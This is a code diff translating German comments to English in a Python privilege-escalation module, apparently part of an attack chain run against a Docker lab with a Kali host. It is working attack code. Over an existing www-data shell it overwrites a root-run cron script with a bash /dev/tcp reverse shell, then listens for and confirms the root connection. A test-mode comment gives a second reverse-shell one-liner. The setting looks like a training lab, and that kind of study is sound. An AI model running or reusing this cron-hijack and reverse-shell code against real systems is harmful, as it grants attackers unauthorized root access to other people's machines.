@@ -6,66 +6,70 @@ import time
 # MITRE ATT&CK: T1053.003 – Cron
 # =============================================================================
 
-# Wird später aus config.py importiert mit:
-# from config import KALI_HOST, PORT_ROOT, CLEANUP_SCRIPT
+# Will later be imported from config.py:
+#   from config import KALI_HOST, PORT_ROOT, CLEANUP_SCRIPT
 KALI_HOST = "10.10.0.2"  # Static IP from compose IPAM; payload uses /dev/tcp/<ip>/<port>
 PORT_ROOT = 5555
 CLEANUP_SCRIPT = "/opt/cleanup.sh"
 
 
 def send_command(shell, command):
-    """Sendet einen Befehl durch eine aktive Shell-Verbindung."""
+    """Send a command through an active shell connection."""
     shell.sendall((command + "\n").encode())
     time.sleep(0.5)
 
 
 def run(www_shell, kali_host=KALI_HOST):
     """
-    Führt Privilege Escalation durch.
+    Run the privilege-escalation step.
 
-    Eingabe:  www_shell (socket) — Bash-Verbindung als www-data
-              vom vorherigen Schritt übergeben
-              kali_host (str)   — IP/Hostname der Kali-Maschine für den
-              Reverse-Shell-Payload (überschreibt das Modul-Default)
-    Ausgabe:  root_shell (socket) — Bash-Verbindung als root
-              wird an nächsten Schritt weitergegeben
+    Args:
+        www_shell (socket): bash connection as www-data, handed in from the
+            previous step.
+        kali_host (str):    IP / hostname of the Kali box that the
+            reverse-shell payload will dial back to (overrides the module
+            default).
+
+    Returns:
+        root_shell (socket): bash connection as root, handed off to the
+            next step.
     """
-    print("\n[*] Starte Privilege Escalation...")
+    print("\n[*] Starting privilege escalation...")
 
-    # Listener VOR dem Überschreiben starten
-    # damit Root-Shell nicht verloren geht
+    # Start the listener BEFORE overwriting cleanup.sh, so the root shell
+    # isn't lost when cron fires.
     root_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     root_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     root_server.bind(("0.0.0.0", PORT_ROOT))
     root_server.listen(1)
-    print(f"[*] Warte auf Root-Shell auf Port {PORT_ROOT}...")
+    print(f"[*] Waiting for root shell on port {PORT_ROOT}...")
 
     try:
-        # cleanup.sh mit Reverse-Shell-Payload überschreiben
-        # > überschreibt, >> hängt an
-        print("[*] Überschreibe cleanup.sh...")
+        # Overwrite cleanup.sh with a reverse-shell payload.
+        # `>` truncates, `>>` appends.
+        print("[*] Overwriting cleanup.sh...")
         send_command(www_shell, f"echo '#!/bin/bash' > {CLEANUP_SCRIPT}")
         send_command(www_shell, f"echo 'bash -i >& /dev/tcp/{kali_host}/{PORT_ROOT} 0>&1' >> {CLEANUP_SCRIPT}")
-        print("[+] cleanup.sh erfolgreich überschrieben")
-        print("[*] Warte auf Cron-Job (max. 60 Sekunden)...")
+        print("[+] cleanup.sh overwritten successfully")
+        print("[*] Waiting for cron job (max. 60 seconds)...")
 
-        # Cron-Job läuft jede Minute → max. 70 Sekunden warten
+        # Cron runs every minute → wait up to 70 seconds.
         root_server.settimeout(70)
 
         try:
             root_shell, addr = root_server.accept()
-            print(f"[+] Root-Shell erhalten von {addr[0]}")
+            print(f"[+] Root shell received from {addr[0]}")
         except socket.timeout:
-            print("[-] Timeout — keine Root-Shell erhalten")
-            print("    → Cron-Daemon läuft nicht: service cron status")
-            print("    → Cron-Job fehlt: cat /etc/cron.d/cleanup")
-            print("    → Dateirechte falsch: ls -la /opt/cleanup.sh")
+            print("[-] Timeout — no root shell received")
+            print("    → cron daemon not running: service cron status")
+            print("    → cron job missing: cat /etc/cron.d/cleanup")
+            print("    → wrong file permissions: ls -la /opt/cleanup.sh")
             return None
     finally:
         root_server.close()
 
-    # Root-Rechte bestätigen — lese in einer Schleife bis "uid=" erscheint
-    # oder das Timeout abläuft (initiales Banner/Prompt wird so nicht übersprungen)
+    # Confirm root — read in a loop until "uid=" appears or the timeout
+    # elapses (so the initial banner / prompt isn't skipped).
     time.sleep(1)
     send_command(root_shell, "id")
     root_shell.settimeout(5)
@@ -82,20 +86,20 @@ def run(www_shell, kali_host=KALI_HOST):
             break
 
     if "uid=0(root)" in response:
-        print("[+] Privilege Escalation erfolgreich!")
+        print("[+] Privilege escalation successful!")
         print(f"[+] {response.strip()}")
     else:
-        print("[-] Root nicht bestätigt")
-        print(f"[?] Antwort: {response}")
+        print("[-] Root not confirmed")
+        print(f"[?] Response: {response}")
 
     return root_shell
 
 
-# Testmodus — wird nicht ausgeführt wenn von attack.py importiert
-# Zum Testen im Apache Container als www-data ausführen:
+# Test mode — not executed when imported by attack.py / main.py.
+# To test manually, run inside the apache container as www-data:
 #   bash -i >& /dev/tcp/kali/4444 0>&1
 if __name__ == "__main__":
-    print("[*] Testmodus — warte auf www-data Shell auf Port 4444")
+    print("[*] Test mode — waiting for www-data shell on port 4444")
 
     test_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     test_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -104,7 +108,7 @@ if __name__ == "__main__":
 
     try:
         www_shell, addr = test_server.accept()
-        print(f"[+] www-data Shell erhalten von {addr[0]}")
+        print(f"[+] www-data shell received from {addr[0]}")
     finally:
         test_server.close()
 
